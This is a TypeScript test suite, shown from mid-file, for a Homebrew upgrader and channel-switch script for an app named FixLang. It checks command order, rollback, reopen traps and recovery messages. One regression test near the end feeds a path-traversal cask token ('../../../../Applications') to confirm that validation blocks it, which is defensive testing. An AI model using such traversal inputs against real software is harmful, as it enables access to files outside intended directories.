        instance: createHomebrewUpgrader({
          isInstalledApp: true,
          logFilePath: "/tmp/userData/logs/homebrew-update.log",
          fileExists: () => true,
          directoryExists,
          startDetached,
          runBrew,
        }),
      };
    })();
    directoryExists.mockClear();

    expect(instance.isVersionInstalled("0.4.0", "fixlang-nightly")).toBe(false);
    expect(directoryExists).not.toHaveBeenCalled();
  });

  it("never runs `brew fetch` for an unrecognized token", async () => {
    const { instance, runBrew } = upgrader();

    await expect(instance.downloadUpdate("fixlang-nightly")).rejects.toThrow();
    expect(runBrew).not.toHaveBeenCalled();
  });

  it("never inspects the download cache for an unrecognized token", () => {
    const { instance } = upgrader({
      cacheEntries: ["abc123--FixLang-0.4.6-arm64.dmg"],
      fileSizes: { "/cache/downloads/abc123--FixLang-0.4.6-arm64.dmg": 128 },
    });

    expect(instance.getDownloadedBytes("0.4.6", "fixlang-nightly")).toBeNull();
  });

  it("never starts the detached helper for an unrecognized token", () => {
    const { instance, startDetached } = upgrader();

    expect(() => instance.startUpgrade(null, "fixlang-nightly")).toThrow();
    expect(startDetached).not.toHaveBeenCalled();
  });
});

describe("active channel detection", () => {
  it("reports stable when only the stable Caskroom entry exists", () => {
    const directoryExists = (candidate: string): boolean =>
      candidate === "/opt/homebrew/Caskroom/fixlang";

    expect(detectActiveCaskChannel("/opt/homebrew/bin/brew", directoryExists)).toBe(
      "stable",
    );
  });

  it("reports beta when only the beta Caskroom entry exists", () => {
    const directoryExists = (candidate: string): boolean =>
      candidate === "/opt/homebrew/Caskroom/fixlang@beta";

    expect(detectActiveCaskChannel("/opt/homebrew/bin/brew", directoryExists)).toBe(
      "beta",
    );
  });

  it("reports both when stable and beta are both staged", () => {
    expect(detectActiveCaskChannel("/opt/homebrew/bin/brew", () => true)).toBe("both");
  });

  it("reports neither as null", () => {
    expect(detectActiveCaskChannel("/opt/homebrew/bin/brew", () => false)).toBeNull();
  });

  it("never spawns a subprocess — only the two directory probes decide the answer", () => {
    const directoryExists = vi.fn(() => false);

    detectActiveCaskChannel("/opt/homebrew/bin/brew", directoryExists);

    expect(directoryExists).toHaveBeenCalledTimes(2);
    expect(directoryExists).toHaveBeenCalledWith("/opt/homebrew/Caskroom/fixlang");
    expect(directoryExists).toHaveBeenCalledWith(
      "/opt/homebrew/Caskroom/fixlang@beta",
    );
  });

  /**
   * REGRESSION: the previous test only counts calls to the injected
   * `directoryExists` probe; it never checks that nothing ELSE ran. A rogue
   * `execSync`/`execFile`/`spawn` call added straight into
   * `detectActiveCaskChannel` (bypassing the injected probe entirely) was
   * observed leaving the whole suite green. These spies wrap the REAL
   * `node:child_process` module object — the same one `homebrew.ts` imports
   * from — so they catch a future direct call even to an export this module
   * does not use today.
   */
  it("never shells out — no child_process call of any kind decides the answer", () => {
    childProcessExecFileMock.mockClear();
    childProcessSpawnMock.mockClear();
    childProcessExecSyncMock.mockClear();
    childProcessExecFileSyncMock.mockClear();

    detectActiveCaskChannel("/opt/homebrew/bin/brew", () => true);

    expect(childProcessExecFileMock).not.toHaveBeenCalled();
    expect(childProcessSpawnMock).not.toHaveBeenCalled();
    expect(childProcessExecSyncMock).not.toHaveBeenCalled();
    expect(childProcessExecFileSyncMock).not.toHaveBeenCalled();
  });
});


describe("channel switch script", () => {
  const escapeRegExp = (value: string): string =>
    value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");

  const BREW = "/opt/homebrew/bin/brew";

  /**
   * Index of `"<brew>" <verb> --cask <token>`, anchored on both ends: the
   * quoted brew path in front rules out "install" matching inside
   * "uninstall" (the same substring problem in the other direction), and the
   * trailing negative lookahead rules out the stable token ("fixlang")
   * matching inside the beta token's command ("fixlang@beta") — while still
   * allowing the token to be followed by `;`, a quote, or whitespace, since
   * the retry/restore commands sit inside `if ! "..." install ...; then`.
   */
  const caskCommandPattern = (verb: string, token: string): RegExp =>
    new RegExp(
      `"${escapeRegExp(BREW)}" ${verb} --cask ${escapeRegExp(token)}(?![A-Za-z0-9@])`,
      "g",
    );

  const indexOfCaskCommand = (
    script: string,
    verb: string,
    token: string,
    fromIndex = 0,
  ): number => {
    const pattern = caskCommandPattern(verb, token);
    pattern.lastIndex = fromIndex;
    const match = pattern.exec(script);
    return match ? match.index : -1;
  };

  /** Every occurrence, so a test can bound a count instead of only ordering. */
  const indicesOfCaskCommand = (
    script: string,
    verb: string,
    token: string,
  ): readonly number[] =>
    [...script.matchAll(caskCommandPattern(verb, token))].map((match) => match.index);

  const script = buildChannelSwitchScript(
    "/opt/homebrew/bin/brew",
    STABLE_CASK_TOKEN,
    BETA_CASK_TOKEN,
  );

  const pgrepIdx = script.indexOf("/usr/bin/pgrep -x FixLang");
  const fetchIdx = indexOfCaskCommand(script, "fetch", BETA_CASK_TOKEN);
  const uninstallIdx = indexOfCaskCommand(script, "uninstall", STABLE_CASK_TOKEN);
  const firstInstallIdx = indexOfCaskCommand(script, "install", BETA_CASK_TOKEN);
  const secondInstallIdx =
    firstInstallIdx === -1
      ? -1
      : indexOfCaskCommand(script, "install", BETA_CASK_TOKEN, firstInstallIdx + 1);
  const restoreSearchStart = Math.max(uninstallIdx, secondInstallIdx) + 1;
  const restoreIdx = indexOfCaskCommand(
    script,
    "install",
    STABLE_CASK_TOKEN,
    restoreSearchStart,
  );
  const trapIdx = script.indexOf("trap reopen_fixlang EXIT");
  const signalTrapIdx = script.indexOf("trap abort_without_reopen ");
  const waitLoopEndIdx = script.indexOf("\ndone\n");

  const switchScript = (brew: string): string =>
    buildChannelSwitchScript(brew, STABLE_CASK_TOKEN, BETA_CASK_TOKEN, APP_PATH);

  it("waits for the app to exit before touching either cask", () => {
    expect(pgrepIdx).toBeGreaterThanOrEqual(0);
    expect(pgrepIdx).toBeLessThan(fetchIdx);
  });

  /**
   * REGRESSION: fetch must fill the download cache while the CURRENT cask is
   * still installed. An uninstall emitted before the fetch was observed
   * failing here against a deliberately broken builder before this landed.
   */
  it("fetches the target cask before uninstalling the current one", () => {
    expect(fetchIdx).toBeGreaterThanOrEqual(0);
    expect(uninstallIdx).toBeGreaterThanOrEqual(0);
    expect(fetchIdx).toBeLessThan(uninstallIdx);
  });

  /**
   * REGRESSION: the target's bundle path only frees up once the current
   * token's cask is gone. An install emitted before the uninstall was
   * observed failing here against a deliberately broken builder before this
   * landed.
   */
  it("uninstalls the current cask before installing the target", () => {
    expect(uninstallIdx).toBeGreaterThanOrEqual(0);
    expect(firstInstallIdx).toBeGreaterThanOrEqual(0);
    expect(uninstallIdx).toBeLessThan(firstInstallIdx);
  });

  /**
   * REGRESSION: this test used to assert only that the second install came
   * after the first, which is true of any number of attempts — inserting a
   * THIRD attempt into the retry ladder left the whole file green. "Exactly
   * once" is an upper bound, so it has to be asserted as a count: an
   * unbounded ladder would stretch the window in which the user has no app
   * installed, which is the failure this whole design is shaped around.
   * Counted before the restore because the last-resort attempt AFTER a failed
   * restore is not a retry of the switch — by then it is the only remaining
   * way to leave the user with any app at all.
   */
  it("retries the target install exactly once before giving up on it", () => {
    expect(firstInstallIdx).toBeGreaterThanOrEqual(0);
    expect(secondInstallIdx).toBeGreaterThan(firstInstallIdx);
    expect(restoreIdx).toBeGreaterThan(secondInstallIdx);

    const attemptsBeforeRestore = indicesOfCaskCommand(
      script,
      "install",
      BETA_CASK_TOKEN,
    ).filter((index) => index < restoreIdx);

    expect(attemptsBeforeRestore).toEqual([firstInstallIdx, secondInstallIdx]);
  });

  it("makes exactly one last-resort target attempt after a failed restore", () => {
    const attemptsAfterRestore = indicesOfCaskCommand(
      script,
      "install",
      BETA_CASK_TOKEN,
    ).filter((index) => index > restoreIdx);

    expect(attemptsAfterRestore).toHaveLength(1);
  });

  /**
   * REGRESSION: a missing restore-original step was observed failing here
   * against a deliberately broken builder before this landed — a failed
   * switch must leave the user where they started, not with nothing.
   */
  it("restores the ORIGINAL token — not the target — after both install attempts fail", () => {
    expect(restoreIdx).toBeGreaterThanOrEqual(0);
    expect(restoreIdx).toBeGreaterThan(secondInstallIdx);
  });

  /**
   * REGRESSION: the test that used to sit here read
   * `lastIndexOf("/usr/bin/open -b com.fixlang.app") > restoreIdx`, which
   * always resolved to the trailing success-path reopen and so was true no
   * matter what the restore branch contained — deleting the reopen from that
   * branch left the whole file green. The reopen is now a single EXIT trap
   * armed the moment the wait loop confirms the app is gone, which is the
   * invariant stated once instead of per branch: below this line the app is
   * off the user's screen, so every exit brings it back.
   */
  it("arms the reopen for every exit path the moment the app is gone", () => {
    expect(trapIdx).toBeGreaterThan(waitLoopEndIdx);
    expect(trapIdx).toBeLessThan(fetchIdx);
    // Two traps and no more: the EXIT reopen, and the signal abort that is
    // its single deliberate exception. Both are armed in the same place and
    // neither is ever disarmed from the script body — `trap - EXIT` appears
    // only inside the signal handler, where suppressing the reopen IS the
    // behaviour.
    expect(script.match(/^trap /gm)).toHaveLength(2);
    expect(script.match(/^ *trap - EXIT$/gm)).toHaveLength(1);
    expect(signalTrapIdx).toBeGreaterThan(trapIdx);
    expect(signalTrapIdx).toBeLessThan(fetchIdx);
    // Both traps name a function, never inline text: a bundle path holding a
    // quote would otherwise escape the trap's own quoting.
    expect(script).toContain("reopen_fixlang() {");
    expect(script).toContain("abort_without_reopen() {");
  });

  /**
   * The tests below execute the emitted script rather than index it, because
   * the defect they pin is reachability: every string was already present and
   * correctly ordered while the control flow skipped straight past it.
   */
  it("reopens the app it made quit when the target fetch fails", () => {
    const { trace, status } = runHelperScript(switchScript, ["fetch:fixlang@beta"]);

    // Nothing was uninstalled, so the user is exactly where they started —
    // which includes still running the app.
    expect(trace).toEqual(["brew fetch fixlang@beta", REOPENED]);
    expect(status).toBe(1);
  });

  /**
   * REGRESSION: `uninstall --cask <current> || exit 1` was the worst outcome
   * this feature can produce — a cask uninstall that fails partway can
   * already have removed the bundle, and the abort reached neither the
   * restore nor the reopen, so the user was left with no app in
   * /Applications and no indication why. Observed by executing the previous
   * script with the uninstall forced to fail: the trace ended at
   * `brew uninstall fixlang`.
   */
  it("reinstalls the current cask and reopens when the uninstall fails", () => {
    const { trace, status, stderr } = runHelperScript(switchScript, ["uninstall:fixlang"]);

    expect(trace).toEqual([
      "brew fetch fixlang@beta",
      "brew fetch fixlang",
      "brew uninstall fixlang",
      "brew install fixlang",
      REOPENED,
    ]);
    expect(stderr).toContain("Failed to uninstall fixlang");
    expect(status).toBe(1);
  });

  it("restores the original token and reopens when both target installs fail", () => {
    const { trace, status } = runHelperScript(switchScript, ["install:fixlang@beta"]);

    expect(trace).toEqual([
      "brew fetch fixlang@beta",
      "brew fetch fixlang",
      "brew uninstall fixlang",
      "brew install fixlang@beta",
      "brew install fixlang@beta",
      "brew install fixlang",
      REOPENED,
    ]);
    expect(status).toBe(1);
  });

  /**
   * Once the rollback itself has failed the user has NO app; at that point
   * "on the channel they did not ask for" beats "none", and the target's DMG
   * is the one still guaranteed to be in the download cache.
   */
  /**
   * REGRESSION: this last-resort install SUCCEEDING was reported as a total
   * failure — exit 1, and a log whose final app-authored line was still
   * "Failed to restore fixlang; trying fixlang@beta once more." The user was
   * on the channel they asked for, and success differed from "nothing is
   * installed" only by the ABSENCE of a further line. The committed version
   * of this test asserted `trace.at(-2)` and `status === 1` and never looked
   * at stderr, so it could not see the difference either.
   */
  it("reports the channel it landed on when the restore fails but the target installs", () => {
    const { trace, status, stderr } = runHelperScript(switchScript, [
      "install:fixlang@beta#1",
      "install:fixlang@beta#2",
      "install:fixlang",
    ]);

    expect(trace.at(-2)).toBe("brew install fixlang@beta");
    expect(trace.at(-1)).toBe(REOPENED);
    expect(stderr).toContain("FixLang is on the fixlang@beta channel");
    // The switch landed on the requested channel, so it is not a failure.
    expect(status).toBe(0);
  });

  /**
   * The neighbouring outcome, for the same reason: a rollback that WORKS is
   * still a failed switch, and it has to say which of the two happened rather
   * than leave the reader to infer it from which line came last.
   */
  it("says the switch did not happen when the rollback succeeds", () => {
    const { status, stderr } = runHelperScript(switchScript, ["install:fixlang@beta"]);

    expect(stderr).toContain("Restored fixlang; the switch to fixlang@beta did not happen.");
    expect(status).toBe(1);
  });

  /**
   * REGRESSION: the restore was the only brew call in either builder with no
   * status check. When it failed, the log's last app-authored line still read
   * "restoring fixlang" — and there is no app left running to report through,
   * so the helper log is the only channel there is.
   */
  it("names the one command that recovers the machine when nothing installs", () => {
    const { stderr, status } = runHelperScript(switchScript, [
      "install:fixlang@beta",
      "install:fixlang",
    ]);

    expect(stderr).toContain("Failed to restore fixlang");
    expect(stderr).toContain("Recover with: brew install --cask fixlang@beta");
    expect(status).toBe(1);
  });

  /**
   * REGRESSION: the recovery line named `currentToken`, so on a REVERT it
   * handed a user who had just asked to leave the pre-release — and who now
   * had no app at all — `brew install --cask fixlang@beta` as their one
   * instruction. The channel they asked for was never named.
   *
   * The revert direction was previously index-checked only, never executed,
   * and the assertion that would have caught this
   * (`toContain("brew install --cask fixlang")`) passes on the revert script
   * regardless, because it is a PREFIX of `...fixlang@beta`. So this asserts
   * the two tokens apart rather than matching a prefix: the requested token
   * must be named and the abandoned one must not.
   */
  it("names the REQUESTED channel in the recovery line, in both directions", () => {
    const revertScript = (brew: string): string =>
      buildChannelSwitchScript(brew, BETA_CASK_TOKEN, STABLE_CASK_TOKEN, APP_PATH);
    const { stderr, status } = runHelperScript(revertScript, [
      "install:fixlang",
      "install:fixlang@beta",
    ]);

    expect(stderr).toContain("Recover with: brew install --cask fixlang\n");
    expect(stderr).not.toContain("Recover with: brew install --cask fixlang@beta");
    expect(status).toBe(1);
  });

  it("pre-stages the rollback download but never blocks the switch on it", () => {
    const { trace, status, stderr } = runHelperScript(switchScript, ["fetch:fixlang"]);

    expect(trace).toEqual([
      "brew fetch fixlang@beta",
      "brew fetch fixlang",
      "brew uninstall fixlang",
      "brew install fixlang@beta",
      REOPENED,
    ]);
    expect(stderr).toContain("Could not pre-stage the fixlang download");
    expect(status).toBe(0);
  });

  it("switches and reopens with no brew step failing", () => {
    expect(runHelperScript(switchScript)).toMatchObject({
      trace: [
        "brew fetch fixlang@beta",
        "brew fetch fixlang",
        "brew uninstall fixlang",
        "brew install fixlang@beta",
        REOPENED,
      ],
      status: 0,
    });
  });

  it("never emits --zap or --force", () => {
    expect(script).not.toContain("--zap");
    expect(script).not.toContain("--force");
  });

  it("refuses to build a script naming an unknown current or target token", () => {
    expect(() =>
      buildChannelSwitchScript(
        "/opt/homebrew/bin/brew",
        "fixlang-nightly",
        BETA_CASK_TOKEN,
      ),
    ).toThrow();
    expect(() =>
      buildChannelSwitchScript(
        "/opt/homebrew/bin/brew",
        STABLE_CASK_TOKEN,
        "fixlang-nightly",
      ),
    ).toThrow();
  });

  it("refuses to switch a token to itself", () => {
    expect(() =>
      buildChannelSwitchScript(
        "/opt/homebrew/bin/brew",
        STABLE_CASK_TOKEN,
        STABLE_CASK_TOKEN,
      ),
    ).toThrow();
  });

  /**
   * The restore step must name whichever token was ORIGINAL for that
   * particular switch — proven here with the tokens reversed, so this is not
   * an artifact of one token happening to be the default.
   */
  it("names the correct original token when the switch direction is reversed", () => {
    const revert = buildChannelSwitchScript(
      "/opt/homebrew/bin/brew",
      BETA_CASK_TOKEN,
      STABLE_CASK_TOKEN,
    );
    const revertUninstallIdx = indexOfCaskCommand(revert, "uninstall", BETA_CASK_TOKEN);
    const revertRestoreIdx = indexOfCaskCommand(
      revert,
      "install",
      BETA_CASK_TOKEN,
      revertUninstallIdx + 1,
    );
    expect(revertUninstallIdx).toBeGreaterThanOrEqual(0);
    expect(revertRestoreIdx).toBeGreaterThan(revertUninstallIdx);
  });
});

describe("canInstall validates the bound cask token", () => {
  /**
   * REGRESSION: `canInstall` was computed straight from `caskroomRoot`,
   * which — unlike every other accessor in this module — never calls
   * `isCaskToken` first. `caskroomRoot("/opt/homebrew/bin/brew",
   * "../../../../Applications")` normalizes (via `path.join`) to
   * "/Applications", so an upgrader constructed with an unrecognized token
   * probed a directory entirely outside the Caskroom and could report
   * `canInstall === true` off of it. This test was observed failing
   * (canInstall === true) against the unmodified code.
   */
  it("never derives canInstall from an unrecognized token's raw, un-validated path", () => {
    const { instance } = upgrader({
      caskToken: "../../../../Applications",
      directories: ["/Applications"],
    });

    expect(instance.canInstall).toBe(false);
  });
});

describe("startUpgrade validates the token it is actually about to run, not just the bound one", () => {
  /**
   * REGRESSION: `startUpgrade`'s guard was `!canInstall`, where `canInstall`
   * is fixed at construction time for the upgrader's BOUND token. A per-call
   * `caskToken` override let a caller ask this beta-bound upgrader (whose
   * `canInstall` is true because the beta Caskroom exists) to run an upgrade
   * for the STABLE token instead — with no stable Caskroom entry at all. The
   * guard let it through, so the detached helper spawned and ran
   * `brew upgrade --cask fixlang || exit 1` against an uninstalled cask
   * AFTER the app had already quit; that failure path in
   * `buildUpgradeScript` exits before ever reaching the reopen command,
   * leaving the user with no running app. This test was observed failing —
   * `startDetached` was called and nothing threw — against the unmodified
   * code.
   */
  it("refuses a per-call token override the bound token's canInstall can't vouch for", () => {
    const { instance, startDetached } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: ["/opt/homebrew/Caskroom/fixlang@beta"],
    });

    expect(() => instance.startUpgrade(null, STABLE_CASK_TOKEN)).toThrow(
      "FixLang was not installed with the Homebrew cask",
    );
    expect(startDetached).not.toHaveBeenCalled();
  });
});
